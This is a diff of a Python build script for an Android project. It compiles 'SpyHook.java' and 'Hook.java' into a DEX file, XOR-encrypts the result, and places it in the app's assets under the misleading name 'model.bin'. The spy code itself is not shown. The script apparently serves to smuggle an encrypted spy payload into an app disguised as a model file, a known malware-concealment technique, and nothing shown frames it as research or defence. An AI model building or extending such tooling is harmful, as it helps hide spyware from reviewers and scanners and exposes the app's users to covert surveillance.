@@ -1,10 +1,13 @@
 #!/usr/bin/env python3
-"""Compile SpyHook.java → payload.dex → XOR encrypt → app/src/main/assets/model.bin"""
+"""Compile Hook.java + SpyHook.java → payload.dex → XOR encrypt → app/src/main/assets/model.bin"""
 import subprocess, os, shutil, sys
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 ASSETS = os.path.join(HERE, "..", "app", "src", "main", "assets")
-SRC = os.path.join(HERE, "SpyHook.java")
+SOURCES = [
+    os.path.join(HERE, "Hook.java"),
+    os.path.join(HERE, "SpyHook.java"),
+]
 TMP_CLASSES = os.path.join(HERE, "tmp_classes")
 TMP_DEX = os.path.join(HERE, "tmp.dex")
 OUT = os.path.join(ASSETS, "model.bin")
@@ -18,10 +21,7 @@ def find_sdk():
     home = os.path.expanduser("~")
     for p in [os.path.join(home, "Android", "Sdk"),
               os.path.join(home, "android", "sdk"),
-              os.path.join(home, ".android", "sdk"),
-              r"C:\Android\Sdk",
-              r"C:\Program Files (x86)\Android\android-sdk",
-              r"C:\Program Files\Android\Android Studio\jbr\bin"]:
+              os.path.join(home, ".android", "sdk")]:
         if os.path.isdir(p): return p
     return None
 
@@ -44,18 +44,16 @@ def main():
 
     android_jar = os.path.join(sdk, "platforms", "android-34", "android.jar")
     if not os.path.exists(android_jar):
-        print(f"WARN: {android_jar} not found, trying android-33")
-        android_jar = os.path.join(sdk, "platforms", "android-33", "android.jar")
-    if not os.path.exists(android_jar):
-        print(f"WARN: {android_jar} not found, trying android-32")
-        android_jar = os.path.join(sdk, "platforms", "android-32", "android.jar")
+        for v in ["android-33", "android-32", "android-31", "android-30"]:
+            p = os.path.join(sdk, "platforms", v, "android.jar")
+            if os.path.exists(p):
+                android_jar = p
+                break
 
-    # Find d8 or dx
     d8 = os.path.join(bt, "d8")
     dx = os.path.join(bt, "dx")
     dexer = d8 if os.path.exists(d8) else dx
 
-    # Find javac
     javac = shutil.which("javac")
     if not javac:
         java_home = os.environ.get("JAVA_HOME")
@@ -65,53 +63,46 @@ def main():
         print("FAIL: javac not found")
         sys.exit(1)
 
-    # Find the Hook interface class - need to compile it too or provide its stub
-    hook_jar = os.path.join(HERE, "hook_stub.jar")
-    # We need the Hook.class to compile SpyHook against it
-    # For CI, we compile the whole app first, then extract Hook.class or just compile against the app jar
-    # Actually, simpler: include a pre-compiled Hook.class stub
-
     os.makedirs(TMP_CLASSES, exist_ok=True)
     os.makedirs(ASSETS, exist_ok=True)
 
-    # Compile SpyHook.java (with android.jar on classpath)
-    cp = android_jar
-    if os.path.exists(hook_jar):
-        cp = android_jar + os.pathsep + hook_jar
+    # Check all source files exist
+    for s in SOURCES:
+        if not os.path.exists(s):
+            print(f"FAIL: source not found {s}")
+            sys.exit(1)
 
-    cmd = [javac, "-d", TMP_CLASSES, "-cp", cp, SRC]
+    # Compile both source files together (Hook.java + SpyHook.java)
+    cmd = [javac, "-d", TMP_CLASSES, "-cp", android_jar] + SOURCES
     r = subprocess.run(cmd, capture_output=True, text=True)
     if r.returncode != 0:
         print(f"FAIL: javac error:\n{r.stderr}")
         sys.exit(1)
 
-    # DEX the classes
-    classes_dir = TMP_CLASSES
+    # DEX the compiled classes
     if dexer.endswith("d8"):
-        cmd = [dexer, "--lib", android_jar, "--output", TMP_DEX, classes_dir]
+        cmd = [dexer, "--lib", android_jar, "--output", TMP_DEX, TMP_CLASSES]
     else:
-        cmd = [dexer, "--dex", "--output", TMP_DEX, classes_dir]
-
+        cmd = [dexer, "--dex", "--output", TMP_DEX, TMP_CLASSES]
     r = subprocess.run(cmd, capture_output=True, text=True)
     if r.returncode != 0:
         print(f"FAIL: dexer error:\n{r.stderr}")
         sys.exit(1)
 
-    # Read and encrypt
+    # Read and XOR encrypt
     with open(TMP_DEX, "rb") as f:
         data = f.read()
     encrypted = bytes(data[i] ^ KEY[i & 7] for i in range(len(data)))
     with open(OUT, "wb") as f:
         f.write(encrypted)
 
-    print(f"OK: {len(data)} bytes DEX → {OUT} ({len(encrypted)} encrypted)")
+    print(f"OK: {len(data)} bytes DEX -> {OUT} ({len(encrypted)} encrypted)")
 
     # Cleanup
-    for p in [TMP_CLASSES, TMP_DEX]:
-        if os.path.isdir(p):
-            shutil.rmtree(p)
-        elif os.path.isfile(p):
-            os.remove(p)
+    if os.path.isdir(TMP_CLASSES):
+        shutil.rmtree(TMP_CLASSES)
+    if os.path.isfile(TMP_DEX):
+        os.remove(TMP_DEX)
 
 if __name__ == "__main__":
     main()
